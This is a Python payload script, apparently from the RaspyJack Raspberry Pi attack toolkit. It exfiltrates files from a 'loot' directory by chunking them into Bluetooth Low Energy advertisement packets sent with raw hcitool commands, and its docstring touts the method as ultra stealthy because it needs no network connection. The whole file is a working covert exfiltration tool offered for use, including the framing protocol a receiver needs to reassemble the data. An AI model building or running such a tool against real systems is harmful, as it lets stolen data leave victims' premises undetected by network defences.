#!/usr/bin/env python3
"""
RaspyJack Payload -- BLE Advertisement Exfiltration
====================================================
Author: 7h30th3r0n3

Ultra stealthy data exfiltration via BLE advertisement packets.
No WiFi or network connection required.

Setup / Prerequisites:
  - Requires Bluetooth adapter (hci0).
  - Receiver must scan for BLE manufacturer ID 0xFFFF to reassemble data.

Encodes data in BLE manufacturer-specific data fields of advertisement
packets. Each advertisement carries ~20 bytes of payload.

Header format per advertisement:
  [seq_num:2bytes][total_chunks:2bytes][data:16bytes]

Uses hcitool to set advertising data and enable advertising.
Receiver needs a BLE scanner filtering for manufacturer ID 0xFFFF.

Controls:
  OK         -- Start exfiltration of selected file
  UP / DOWN  -- Select file from loot directory
  KEY1       -- Adjust TX interval (50ms / 100ms / 200ms / 500ms)
  KEY3       -- Exit
"""

import os
import sys
import time
import json
import struct
import subprocess
import threading
import math
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_ROOT = "/root/Raspyjack/loot"
BLE_LOOT_DIR = os.path.join(LOOT_ROOT, "BLEExfil")
DEBOUNCE = 0.25

# BLE advertising constants
MANUFACTURER_ID = 0xFFFF  # Custom manufacturer ID for our protocol
HCI_DEVICE = "hci0"
HEADER_SIZE = 4  # 2 bytes seq + 2 bytes total
DATA_PER_CHUNK = 16  # 16 bytes of payload data per advertisement
CHUNK_SIZE = HEADER_SIZE + DATA_PER_CHUNK  # 20 bytes total

# TX interval options in seconds
TX_INTERVALS = [0.05, 0.1, 0.2, 0.5]
TX_INTERVAL_LABELS = ["50ms", "100ms", "200ms", "500ms"]

os.makedirs(BLE_LOOT_DIR, exist_ok=True)

# ---------------------------------------------------------------------------
# Thread-safe state
# ---------------------------------------------------------------------------
_lock = threading.Lock()
_state = {
    "files": [],
    "selected_idx": 0,
    "scroll_offset": 0,
    "tx_interval_idx": 1,  # default 100ms
    "exfil_active": False,
    "abort_exfil": False,
    "current_file": "",
    "chunks_sent": 0,
    "total_chunks": 0,
    "progress_pct": 0.0,
    "bytes_total": 0,
    "eta_seconds": 0,
    "status": "Ready",
    "last_message": "",
    "ble_available": False,
}


def _get_state():
    with _lock:
        return dict(_state)


def _set_state(**kwargs):
    with _lock:
        for k, v in kwargs.items():
            _state[k] = v


# ---------------------------------------------------------------------------
# File discovery
# ---------------------------------------------------------------------------
def _scan_loot_files():
    """Discover files in loot directory."""
    files = []
    if not os.path.isdir(LOOT_ROOT):
        return files

    for dirpath, _dirnames, filenames in os.walk(LOOT_ROOT):
        if "BLEExfil" in dirpath:
            continue
        for fname in sorted(filenames):
            fpath = os.path.join(dirpath, fname)
            if os.path.isfile(fpath):
                rel_path = os.path.relpath(fpath, LOOT_ROOT)
                size = os.path.getsize(fpath)
                files.append({
                    "path": fpath,
                    "rel_path": rel_path,
                    "name": fname,
                    "size": size,
                })
    return files


def _refresh_file_list():
    """Update the file list in state."""
    files = _scan_loot_files()
    st = _get_state()
    new_idx = min(st["selected_idx"], max(0, len(files) - 1))
    _set_state(files=files, selected_idx=new_idx)


def _format_size(size_bytes):
    """Format bytes as human-readable string."""
    if size_bytes < 1024:
        return f"{size_bytes}B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.1f}K"
    return f"{size_bytes / (1024 * 1024):.1f}M"


# ---------------------------------------------------------------------------
# BLE adapter management
# ---------------------------------------------------------------------------
def _check_ble():
    """Check if BLE adapter is available."""
    try:
        result = subprocess.run(
            ["hciconfig", HCI_DEVICE],
            capture_output=True, text=True, timeout=5,
        )
        available = result.returncode == 0 and "UP" in result.stdout
        _set_state(ble_available=available)
        return available
    except (FileNotFoundError, subprocess.TimeoutExpired):
        _set_state(ble_available=False)
        return False


def _enable_ble():
    """Bring up the BLE adapter."""
    try:
        subprocess.run(
            ["hciconfig", HCI_DEVICE, "up"],
            capture_output=True, timeout=5,
        )
        time.sleep(0.5)
        return _check_ble()
    except Exception:
        return False


def _start_advertising():
    """Enable BLE advertising mode."""
    try:
        # Set advertising parameters (non-connectable undirected)
        subprocess.run(
            ["hcitool", "-i", HCI_DEVICE, "cmd", "0x08", "0x0006",
             "A0", "00",  # min interval (100ms)
             "A0", "00",  # max interval (100ms)
             "03",        # ADV_NONCONN_IND
             "00",        # own address type: public
             "00",        # peer address type
             "00", "00", "00", "00", "00", "00",  # peer address
             "07",        # channel map: all channels
             "00"],       # filter policy
            capture_output=True, timeout=5,
        )
        # Enable advertising
        subprocess.run(
            ["hcitool", "-i", HCI_DEVICE, "cmd", "0x08", "0x000A", "01"],
            capture_output=True, timeout=5,
        )
        return True
    except Exception:
        return False


def _stop_advertising():
    """Disable BLE advertising."""
    try:
        subprocess.run(
            ["hcitool", "-i", HCI_DEVICE, "cmd", "0x08", "0x000A", "00"],
            capture_output=True, timeout=5,
        )
    except Exception:
        pass


def _set_adv_data(raw_bytes):
    """
    Set BLE advertising data using hcitool.
    Wraps raw_bytes in a manufacturer-specific AD structure.
    """
    # AD structure: [length][type=0xFF][manufacturer_id_le][data...]
    mfr_id_le = struct.pack("<H", MANUFACTURER_ID)
    ad_payload = mfr_id_le + raw_bytes

    # AD type 0xFF = Manufacturer Specific Data
    ad_length = len(ad_payload) + 1  # +1 for type byte
    ad_struct = bytes([ad_length, 0xFF]) + ad_payload

    # Pad to 31 bytes (max advertising data)
    total_len = len(ad_struct)
    padded = ad_struct + b'\x00' * (31 - total_len)

    # Format as hex string for hcitool
    hex_bytes = [f"{b:02X}" for b in padded]

    # HCI command: LE Set Advertising Data
    # OGF=0x08, OCF=0x0008
    cmd = [
        "hcitool", "-i", HCI_DEVICE, "cmd",
        "0x08", "0x0008",
        f"{total_len:02X}",  # length of significant data
    ] + hex_bytes

    try:
        result = subprocess.run(
            cmd, capture_output=True, timeout=5,
        )
        return result.returncode == 0
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Chunking and transmission
# ---------------------------------------------------------------------------
def _fragment_file(filepath):
    """
    Read file and fragment into chunks.
    Returns list of raw chunk bytes (header + data).
    """
    with open(filepath, "rb") as f:
        raw_data = f.read()

    total_chunks = max(1, math.ceil(len(raw_data) / DATA_PER_CHUNK))
    chunks = []

    for i in range(total_chunks):
        start = i * DATA_PER_CHUNK
        end = min(start + DATA_PER_CHUNK, len(raw_data))
        data_segment = raw_data[start:end]

        # Pad to DATA_PER_CHUNK bytes
        if len(data_segment) < DATA_PER_CHUNK:
            data_segment = data_segment + b'\x00' * (DATA_PER_CHUNK - len(data_segment))

        # Header: seq_num (2 bytes, big-endian) + total_chunks (2 bytes, big-endian)
        header = struct.pack(">HH", i, total_chunks)
        chunk = header + data_segment
        chunks.append(chunk)

    return chunks, len(raw_data)


def _send_preamble(filename, total_chunks, file_size):
    """
    Send a preamble advertisement with file metadata.
    Uses seq_num=0xFFFF as a special marker.
    """
    # Encode filename (truncated to 16 bytes)
    name_bytes = filename.encode("utf-8")[:DATA_PER_CHUNK]
    name_bytes = name_bytes + b'\x00' * (DATA_PER_CHUNK - len(name_bytes))

    header = struct.pack(">HH", 0xFFFF, total_chunks)
    preamble = header + name_bytes
    _set_adv_data(preamble)
    time.sleep(0.3)  # Hold preamble longer for receiver to catch


def _send_epilogue(total_chunks):
    """
    Send epilogue advertisement signaling end of transmission.
    Uses seq_num=0xFFFE as marker.
    """
    header = struct.pack(">HH", 0xFFFE, total_chunks)
    epilogue = header + b'\x00' * DATA_PER_CHUNK
    _set_adv_data(epilogue)
    time.sleep(0.3)


def _exfil_file(file_info):
    """Exfiltrate a single file via BLE advertisements."""
    st = _get_state()
    tx_interval = TX_INTERVALS[st["tx_interval_idx"]]
    filepath = file_info["path"]
    filename = file_info["name"]

    _set_state(
        exfil_active=True,
        abort_exfil=False,
        current_file=filename,
        status="Fragmenting",
        chunks_sent=0,
        progress_pct=0.0,
    )

    # Fragment the file
    try:
        chunks, file_size = _fragment_file(filepath)
    except (FileNotFoundError, PermissionError) as exc:
        _set_state(
            status="Error",
            last_message=f"Read err: {str(exc)[:15]}",
            exfil_active=False,
        )
        return False

    total = len(chunks)
    _set_state(
        total_chunks=total,
        bytes_total=file_size,
        status="TX Preamble",
    )

    # Estimate time
    eta = total * tx_interval
    _set_state(eta_seconds=int(eta))

    # Enable advertising
    if not _start_advertising():
        _set_state(
            status="Error",
            last_message="BLE adv failed",
            exfil_active=False,
        )
        return False

    # Send preamble
    _send_preamble(filename, total, file_size)

    # Transmit chunks
    _set_state(status="Transmitting")
    start_time = time.time()

    for i, chunk in enumerate(chunks):
        if _get_state()["abort_exfil"]:
            _stop_advertising()
            _set_state(
                status="Aborted",
                last_message=f"Aborted at {i}/{total}",
                exfil_active=False,
            )
            return False

        _set_adv_data(chunk)
        time.sleep(tx_interval)

        # Update progress
        progress = ((i + 1) / total) * 100
        elapsed = time.time() - start_time
        remaining = (elapsed / (i + 1)) * (total - i - 1) if i > 0 else eta
        _set_state(
            chunks_sent=i + 1,
            progress_pct=progress,
            eta_seconds=int(remaining),
        )

    # Send epilogue
    _set_state(status="TX Epilogue")
    _send_epilogue(total)

    _stop_advertising()

    elapsed = time.time() - start_time
    _log_exfil(filename, file_size, total, elapsed)

    _set_state(
        status="Complete",
        last_message=f"Done in {elapsed:.1f}s",
        progress_pct=100.0,
        exfil_active=False,
    )
    return True


def _log_exfil(filename, size, chunks, duration):
    """Log exfiltration to manifest."""
    log_path = os.path.join(BLE_LOOT_DIR, "ble_exfil_log.jsonl")
    entry = {
        "timestamp": datetime.now().isoformat(),
        "filename": filename,
        "size_bytes": size,
        "chunks": chunks,
        "duration_seconds": round(duration, 2),
    }
    try:
        with open(log_path, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        pass


# ---------------------------------------------------------------------------
# ETA formatting
# ---------------------------------------------------------------------------
def _format_eta(seconds):
    """Format ETA as human-readable string."""
    if seconds <= 0:
        return "0s"
    minutes = seconds // 60
    secs = seconds % 60
    if minutes > 0:
        return f"{minutes}m{secs}s"
    return f"{secs}s"


# ---------------------------------------------------------------------------
# LCD drawing
# ---------------------------------------------------------------------------
def _draw_lcd():
    """Render current state on LCD."""
    st = _get_state()
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "BLE EXFIL", font=font, fill="#8844FF")
    ble_color = "#00FF00" if st["ble_available"] else "#FF0000"
    d.ellipse((105, 3, 113, 11), fill=ble_color)
    d.text((115, 1), "BT", font=font, fill=ble_color)

    # TX interval display
    interval_label = TX_INTERVAL_LABELS[st["tx_interval_idx"]]
    d.text((2, 16), f"TX: {interval_label}", font=font, fill="#888")

    # Active transfer display
    if st["exfil_active"] or st["status"] in ("Complete", "Aborted", "Error"):
        d.text((2, 28), f"F: {st['current_file'][:17]}", font=font, fill="#AAAAAA")

        # Progress bar
        bar_y = 40
        d.rectangle((2, bar_y, 125, bar_y + 10), outline="#444")
        bar_w = int(123 * st["progress_pct"] / 100)
        if bar_w > 0:
            bar_color = "#8844FF" if st["status"] != "Error" else "#AA0000"
            d.rectangle((2, bar_y, 2 + bar_w, bar_y + 10), fill=bar_color)
        pct_text = f"{st['progress_pct']:.0f}%"
        d.text((52, bar_y + 1), pct_text, font=font, fill="white")

        # Chunk counter
        d.text((2, 54), f"Chunks: {st['chunks_sent']}/{st['total_chunks']}", font=font, fill="#888")

        # ETA
        eta_str = _format_eta(st["eta_seconds"])
        d.text((2, 66), f"ETA: {eta_str}", font=font, fill="#888")

        # File size
        d.text((70, 54), _format_size(st["bytes_total"]), font=font, fill="#888")

    # File list
    files = st["files"]
    if files:
        list_y = 78 if st["exfil_active"] else 30
        max_visible = (105 - list_y) // 11
        scroll = st["scroll_offset"]

        for i in range(max_visible):
            file_idx = scroll + i
            if file_idx >= len(files):
                break
            f = files[file_idx]
            y = list_y + i * 11
            is_sel = (file_idx == st["selected_idx"])

            if is_sel:
                d.rectangle((0, y, 127, y + 10), fill="#332255")

            name_display = f["name"][:14]
            size_display = _format_size(f["size"])
            fg = "#FFFFFF" if is_sel else "#666666"
            d.text((2, y), name_display, font=font, fill=fg)
            d.text((100, y), size_display, font=font, fill="#888")
    else:
        d.text((10, 50), "No loot files", font=font, fill="#666")

    # Status / message
    d.rectangle((0, 106, 127, 115), fill="#0A0A0A")
    status_color = "#00FF00" if st["status"] == "Complete" else "#FFCC00"
    if st["status"] == "Error":
        status_color = "#FF0000"
    msg = st["last_message"] if st["last_message"] else st["status"]
    d.text((2, 106), msg[:21], font=font, fill=status_color)

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "OK:TX K1:Intv K3:Quit", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    _refresh_file_list()

    # Check BLE
    ble_ok = _check_ble()
    if not ble_ok:
        ble_ok = _enable_ble()

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 16), "BLE EXFIL", font=font, fill="#8844FF")
    d.text((4, 32), "Stealth BLE adverts", font=font, fill="#888")
    ble_splash_color = "#00FF00" if ble_ok else "#FF0000"
    d.text((4, 48), f"BLE: {'OK' if ble_ok else 'NOT FOUND'}", font=font, fill=ble_splash_color)
    d.text((4, 64), "OK=Start  U/D=Select", font=font, fill="#666")
    d.text((4, 76), "K1=TX interval", font=font, fill="#666")
    d.text((4, 88), "K3=Exit", font=font, fill="#666")
    d.text((4, 104), f"Mfr ID: 0x{MANUFACTURER_ID:04X}", font=font, fill="#444")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)

    try:
        while True:
            _draw_lcd()
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                _set_state(abort_exfil=True)
                break

            elif btn == "OK":
                st = _get_state()
                if st["exfil_active"]:
                    _set_state(abort_exfil=True)
                elif st["files"] and st["ble_available"]:
                    file_info = st["files"][st["selected_idx"]]
                    threading.Thread(
                        target=_exfil_file,
                        args=(file_info,),
                        daemon=True,
                    ).start()
                elif not st["ble_available"]:
                    _set_state(last_message="No BLE adapter!")
                else:
                    _set_state(last_message="No files")
                time.sleep(DEBOUNCE)

            elif btn == "UP":
                st = _get_state()
                new_idx = max(0, st["selected_idx"] - 1)
                scroll = st["scroll_offset"]
                if new_idx < scroll:
                    scroll = new_idx
                _set_state(selected_idx=new_idx, scroll_offset=scroll)
                time.sleep(DEBOUNCE)

            elif btn == "DOWN":
                st = _get_state()
                max_idx = max(0, len(st["files"]) - 1)
                new_idx = min(max_idx, st["selected_idx"] + 1)
                scroll = st["scroll_offset"]
                max_visible = 6
                if new_idx >= scroll + max_visible:
                    scroll = new_idx - max_visible + 1
                _set_state(selected_idx=new_idx, scroll_offset=scroll)
                time.sleep(DEBOUNCE)

            elif btn == "KEY1":
                st = _get_state()
                new_idx = (st["tx_interval_idx"] + 1) % len(TX_INTERVALS)
                _set_state(tx_interval_idx=new_idx)
                label = TX_INTERVAL_LABELS[new_idx]
                _set_state(last_message=f"Interval: {label}")
                time.sleep(DEBOUNCE)

            elif btn == "LEFT" or btn == "RIGHT":
                _refresh_file_list()
                _set_state(last_message="Files refreshed")
                time.sleep(DEBOUNCE)

            time.sleep(0.05)

    finally:
        _set_state(abort_exfil=True)
        _stop_advertising()
        time.sleep(0.3)
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
